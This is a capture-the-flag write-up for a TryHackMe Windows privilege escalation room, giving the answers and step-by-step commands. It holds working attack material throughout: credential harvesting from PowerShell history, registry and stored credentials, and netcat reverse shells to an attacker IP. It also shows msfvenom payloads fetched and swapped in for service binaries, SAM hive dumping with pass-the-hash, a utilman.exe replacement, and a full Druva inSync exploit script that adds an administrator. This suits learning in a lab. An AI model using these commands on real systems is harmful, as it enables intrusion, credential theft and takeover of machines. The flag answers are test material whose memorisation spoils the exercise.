![Windows Privilege Escalation Banner](Windows_Privilege_Escalation_Banner.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Cover.png" alt="Windows Privilege Escalation Logo">
</p>

# Windows Privilege Escalation

This guide contains the answer and steps necessary to get to them for the [Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20) room.

## Table of contents

- [Windows Privilege Escalation](#windows-privilege-escalation)
- [Harvesting Passwords from Usual Spots](#harvesting-passwords-from-usual-spots)
- [Other Quick Wins](#other-quick-wins)
- [Abusing Service Misconfigurations](#abusing-service-misconfigurations)
- [Abusing dangerous privileges](#abusing-dangerous-privileges)
- [Abusing vulnerable software](#abusing-vulnerable-software)
- [Tools of the Trade ](#tools-of-the-trade)

### Windows Privilege Escalation

1. Users that can change system configurations are part of which group?

   This answer can be found in the text.

   ><details><summary>Click for answer</summary>Administrators</details>

2. The SYSTEM account has more privileges than the Administrator user (aye/nay)

   This answer can be found in the text.

   ><details><summary>Click for answer</summary>aye</details>

### Harvesting Passwords from Usual Spots

1. A password for the julia.jones user has been left on the Powershell history. What is the password?

   We can use the following cmd command to list the powershell history.

   ```cmd
   type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
   ```

   ![Harvesting Powershell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_Powershell.png)

   ><details><summary>Click for answer</summary>ZuperCkretPa5z</details>

2. A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?

   First we open the config file located at: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`. We then look for any mentions of the account `db_admin`.

   ![Harvesting IIS](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_IIS.png)

   ><details><summary>Click for answer</summary>098n0x35skjD3</details>

2. There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.

   Looking through the stored credentials, we can see mikes credentials are indeed on the system.

   ```cmd
   cmdkey /list
   ```

   ![Harvesting Creds](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_Creds.png)

   Now we can spawn a shell under this user and view the flag.

   ```cmd
   runas /savecred /user:admin cmd.exe
   ```

   ![Harvesting Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_Flag.png)
   
   ><details><summary>Click for answer</summary>THM{WHAT_IS_MY_PASSWORD}/details>

4. Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?

   We can use the following command to view stored credentials in Putty.

   ```cmd
   reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
   ```

   ![Harvesting Putty](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_Putty.png)

   ><details><summary>Click for answer</summary>CoolPass2021</details>

### Other Quick Wins

1. What is the taskusr1 flag?

   First we query the task scheduler to find more information on the misconfigured task.

   ```cmd
   schtasks /query /tn vulntask /fo list /v
   ```

   ![Quick Task](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Task.png)

   Using `icacls` we can see the permission we have to modify this file. Looks like we can edit it.

   ```cmd
   icacls C:\tasks\schtask.bat
   ```
   
   ![Quick Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Permissions.png)

   Now lets edit the bat file to execute our reverse shell.

   ```cmd
   echo C:\Tools\nc64.exe -e cmd.exe 10.18.78.136 1337 > C:\tasks\schtask.bat
   ```

   ![Quick Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Script.png)


   Last thing to do, is set up our listener and run the task manually.

   ```cmd
   nc -nlvp 1337

   schtasks /run /tn vulntask
   ```
   
   ![Quick Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Reverse_Shell.png)

   Now we can navigate to the users desktop and read the flag.

   ![Quick Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Flag.png)

   ><details><summary>Click for answer</summary>THM{TASK_COMPLETED}</details>

### Abusing Service Misconfigurations

1. Get the flag on svcusr1's desktop.

   Lets first query the service configuration and see if we have permission to modify the executable.

   ```cmd
   sc qc WindowsScheduler

   icacls C:\PROGRA~2\SYSTEM~1\WService.exe
   ```

   ![Services Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Permissions.png)

   Looks like we can. Now we can make our reverse payload with msfvenom.

   ```cmd
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f exe-service -o rev-svc.exe

   python3 -m http.server 8080

   nc -nlvp 1337
   ```

   After setting up our http server and listener we can use powershell on the target system to transfer the file.

   ```cmd
   wget 10.18.78.136:8080/rev-svc.exe -o rev-svc.exe
   ```

   Now we can create a backup of the original executabel and copy our own into the folder.

   ```cmd
   move WService.exe WService.exe.bkp

   move C:\Users\thm-unpriv\rev-svc.exe WService.exe

   icacls WService.exe /grant Everyone:F
   ```

   ![Services Move File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Move_File.png)
   
   The last thing to do, is stopping the service and then restarting it.

   ```cmd
   sc stop windowsscheduler
   
   sc start windowsscheduler
   ```

   ![Services Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Connection.png)
   
   Now we can look for the flag on the users desktop.

   ![Services Flag1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Flag1.png)

   ><details><summary>Click for answer</summary>THM{AT_YOUR_SERVICE}</details>

2. Get the flag on svcusr2's desktop.

   We will first check the the permissions for the installation path for the "disk sorter enterprise" service.

   ```cmd
   sc qc "disk sorter enterprise"

   icacls C:\MyPrograms
   ```

   ![Services Quotes Service](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Quotes_Service.png)

   Now we can create another reverse shell to use. Then we transfer it over to the target system and move in to the correct folder. Lastly, we must give everyone permission to use the file.

   ```cmd
   msfvenom -p windows/x64/shell_reverse_tcp lhost=10.18.78.136 lport=1337 -f exe-service -o rev-svc2.exe

   python3 -m http.server 8080

   wget 10.18.78.136:8080/rev-svc2.exe -o rev-svc2.exe

   move C:\Users\thm-unpriv\rev-svc2.exe Disk.exe

   icacls C:\MyPrograms\Disk.exe /grant Everyone:F
   ```
   
   Then we set up our listener and stop/start the service to receive a connection.

   ```cmd
   nc -nlvp 1337

   sc stop "disk sorter enterprise"

   sc start "disk sorter enterprise"
   ```
   
   ![Services Quotes Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Quotes_Connection.png)

   Now, we only have to look for and read the flag.

   ![Services Quotes Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Quotes_Flag.png)

   ><details><summary>Click for answer</summary>THM{QUOTES_EVERYWHERE}</details>

3. Get the flag on the Administrator's desktop.

   First we check the permission for the service DACL configuration using Sysinternals suite.

   ```cmd
   C:\tools\AccessChk>accesschk64.exe -qlc thmservice
   ```

   ![Services Config Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Config_Permissions.png)
   
   Looks like we (BUILTIN\Users) have permission (SERVICE_ALL_ACCESS) to change the configuration.
   
   ```cmd
   sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
   ```
   
   Now we can create another reverse shell to use. Then we transfer it over to the target system and move in to the correct folder. Lastly, we must give everyone permission to use the file.

   ```cmd
   msfvenom -p windows/x64/shell_reverse_tcp lhost=10.18.78.136 lport=1337 -f exe-service -o rev-svc3.exe

   python3 -m http.server 8080

   wget 10.18.78.136:8080/rev-svc2.exe -o rev-svc3.exe

   icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
   ```

   Then we set up our listener and stop/start the service to receive a connection.
   
   ```cmd
   nc -nlvp 1337

   sc stop "thmservice"

   sc start "thmservice"
   ```
   
   ![Services Config Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Config_Connection.png)
   
   Now, we only have to look for and read the flag.
   
   ![Services Config Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Config_Flag.png)
   
   ><details><summary>Click for answer</summary>THM{INSECURE_SVC_CONFIG}</details>

### Abusing dangerous privileges

In this task we will use three different methods to get adminstrator privileges. After that it is trivial to find the flag.

1. Get the flag on the Administrator's desktop.

   **SeBackup / SeRestore**

   Checking for privileges with:

   ```cmd
   whoami /priv
   ```

   ![Windows Privs Privileges](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Privileges.png)
   
   Now that we know we can read/write files we can copy the SYSTEM and SAM hives to our account folder.

   ```cmd
   reg save hklm\system C:\Users\THMBackup\system.hive
   reg save hklm\sam C:\Users\THMBackup\sam.hive
   ```

   ![Windows Privs Copy](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Copy.png)

   Now we start a SMB server on our attack machine using `impacket` and transfer the files.

   ```cmd
   impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share

   copy sam.hive \\10.18.78.136\public
   copy system.hive \\10.18.78.136\public
   ```

   ![Windows Privs Transfered](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Transfered.png)

   Again using `impacket` we can now extract the administrators hash from these files.

   ```cmd
   impacket-secretsdump -sam sam.hive -system system.hive LOCAL
   ```

   ![Windows Privs Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Hash.png)

   With this hash we can perform a Pash the Hash attack on the target machine.

   ```cmd
   impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 Administrator@10.10.8.101
   ```

   ![Windows Privs Connection1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Connection1.png)

   **SeTakeOwnership**

   We can use this to take ownership of the `Utilman.exe` executable as it runs with SYSTEM privileges and replace it with a copy of `cmd.exe`.

   Locating the executables in `C:\Windows\system32`, we can use the following commands.

   ```cmd
   takeown /f Utilman.exe

   icacls Utilman.exe /grant THMTakeOwnership:F

   copy cmd.exe Utilman.exe
   ```

   ![Windows Privs Take Ownership](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Take_Ownership.png)

   Now we have successfully taken owners ship of utilman, gotten full permissions, and replaced it with 'cmd.exe`.

   Now we can lock the screen and access ease of accces, which will spawn a command shell instead.

   ![Windows Privs Connection2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Connection2.png)

   **SeImpersonate / SeAssignPrimaryToken**

   For this we abuse the webshell we currently have running whose user has these privileges set. Checking with `whoami /priv` should confirm this.

   ![Windows Privs Privileges3](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Privileges3.png)


   Next, we need to start a listener on our machine.

   ```cmd
   nc -nlvp 1337
   ```
   
   Now we run RogueWinRM to execute netcat which should connect to our machine with a command shell.

   ```cmd
   C:\Tools\RogueWinRM\RogueWinRM.exe -p "C:\Tools\nc64.exe" -a "-e cmd.exe 10.18.78.136 1337"
   ```

   ![Windows Privs Connection3](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Connection3.png)

   ><details><summary>Click for answer</summary>THM{SEFLAGPRIVILEGE}</details>
   
### Abusing vulnerable software

1. Get the flag on the Administrator's desktop.

We first use wmic to see which programs are installed. Then we can investigate which one we can abuse.

   ```cmd
   wmic product get name,version,vendor
   ```

   ![Software Programs](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Software_Programs.png)

   In this exercise we use the vulnerable Druva InSync. We will modify the provided exploit to add the `pwnd` user to the administrators group.

   ```ps
   $ErrorActionPreference = "Stop"

   $cmd = "net user pwnd /add & net localgroup administrators pwnd /add"

   $s = New-Object System.Net.Sockets.Socket(
       [System.Net.Sockets.AddressFamily]::InterNetwork,
       [System.Net.Sockets.SocketType]::Stream,
       [System.Net.Sockets.ProtocolType]::Tcp
   )
   $s.Connect("127.0.0.1", 6064)

   $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
   $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
   $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
   $length = [System.BitConverter]::GetBytes($command.Length);

   $s.Send($header)
   $s.Send($rpcType)
   $s.Send($length)
   $s.Send($command)
   ```

   Remember to save this file as `.ps1`. Now we can run this script using powershell.

   ```ps
   .\letmein.ps1
   ```

   We can check if this has worked by looking up the user.

   ```cmd
   net user pwnd
   ```
   
   ![Software User](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Software_User.png)
   
   To get to the flag, we should open a command prompt as adminstrator. When asked for credentials, we choose pwnd and can leave the password blank (as we didn't specify any).

   ![Software Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Software_Flag.png)

   ><details><summary>Click for answer</summary>THM{EZ_DLL_PROXY_4ME}</details>
